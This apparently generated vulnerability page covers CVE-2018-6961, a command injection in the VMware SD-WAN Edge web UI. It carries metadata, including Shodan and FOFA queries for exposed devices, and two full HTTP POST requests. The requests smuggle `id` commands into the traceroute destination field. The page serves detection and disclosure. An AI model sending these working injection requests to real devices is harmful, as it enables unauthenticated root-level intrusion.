---
layout: post
cve_id: CVE-2018-6961
title: VMware NSX SD-WAN Edge - Command Injection
pcap: true
pcap_path: /pcaps/2018/CVE-2018-6961.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-6961.yaml
snort2_rule: N/A
snort3_rule: N/A
author: D3nverNg,thewindghost
severity: critical
impact: 'Successful exploitation allows unauthenticated remote code execution as root.

  '
remediation: 'Upgrade to VMware SD-WAN Edge version 3.1.2 or later (diagnostic web
  UI component removed).

  '
reference:
- https://www.vmware.com/security/advisories/VMSA-2018-0011.html
- https://www.exploit-db.com/exploits/44959
- https://nvd.nist.gov/vuln/detail/CVE-2018-6961
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.1
  cve-id: CVE-2018-6961
  epss-score: 0.93224
  epss-percentile: 0.99787
  cwe-id: CWE-78
metadata:
  verified: true
  max-request: 2
  vendor: vmware
  product: nsx_sd-wan_edge
  shodan-query: title:"VeloCloud"
  fofa-query: title="VeloCloud"
tags:
- cve
- cve2018
- vmware
- nsx
- sd-wan
- velocloud
- rce
- kev
- vkev
---

## üîç Vulnerability Description
VMware NSX SD-WAN Edge (formerly VeloCloud Edge) before 3.1.2 contains an unauthenticated command injection in the local web UI diagnostic tools (Ping/Traceroute). This template detects it reliably by injecting 'id', 'whoami', and a random marker.


## üåê HTTP Request
```nohighlight
POST /scripts/ajaxPortal.lua HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Content-Length: 101
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip

destination=8.8.8.8`id`&source=ge1&test=TRACEROUTE&requestTimeout=900&auth_token=&_cmd=run_diagnostic
```

```nohighlight
POST /scripts/ajaxPortal.lua HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Content-Length: 118
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip

destination=8.8.8.8$(id;echo KWBQ1NHeFE)&source=ge1&test=TRACEROUTE&requestTimeout=900&auth_token=&_cmd=run_diagnostic
```

